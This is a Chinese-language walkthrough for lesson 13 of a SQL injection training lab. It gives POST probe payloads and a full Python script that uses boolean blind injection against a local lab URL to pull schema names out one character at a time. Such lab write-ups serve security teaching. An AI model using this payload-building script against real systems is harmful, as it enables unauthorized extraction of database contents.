# Lesson-13
```
Bool盲注POST)
```

和上道题基本相同 , 只是把双引号改成单引号
还有值得注意的一点是 :
如何根据bool来判断(上道题也是自己疏忽了)
可以通过页面中显示的那个图片来判断 , 而不必去判断用户名和密码是否显示出来
Bool盲注比较关键的一点也就是在寻找SQL语句是否成功执行的线索
```
postDate = {"uname":"admin","passwd":"admin"}
postDate = {"uname":"'","passwd":"admin"}
postDate = {"uname":"')or 1-- ","passwd":"admin"}
postDate = {"uname":"')or ()-- ","passwd":"admin"}
```

```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	# admin' or ()-- 
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	payload = {"uname":"')or (" + payload + ")-- ","passwd":"admin"}
	return payload

def exce(indexOfResult,indexOfChar,mid):
	# content-start
	url = "http://127.0.0.1/Less-13/"
	postData = getPayload(indexOfResult,indexOfChar,mid)
	content = requests.post(url, data=postData).text
	# content-end
	# judge-start
	if "<img src=\"../images/flag.jpg\"   />" in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
